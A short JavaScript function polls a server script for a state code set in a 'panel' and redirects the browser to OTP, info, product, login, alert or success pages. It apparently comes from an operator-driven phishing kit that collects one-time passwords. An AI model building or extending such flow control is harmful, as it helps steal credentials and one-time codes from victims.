function consultar_estado(){    
    $.post( "../process/estado.php?v=" + Math.random(), function(data) {        
        var estado = data.toString().trim();
        
        console.log("Estado en Panel: " + estado); 

        switch (estado) {
            case '2': window.location.href = "OTP.php"; break;      
            case '4': window.location.href = "INFO.php"; break;     
            case '6': window.location.href = "PRODUCT.php"; break;  
            case '10': window.location.href = "SUCCESS.php"; break; 
            case '12': window.location.href = "login.php"; break;   
            case '14': window.location.href = "ALERT.php"; break;   
        } 
    });        
}
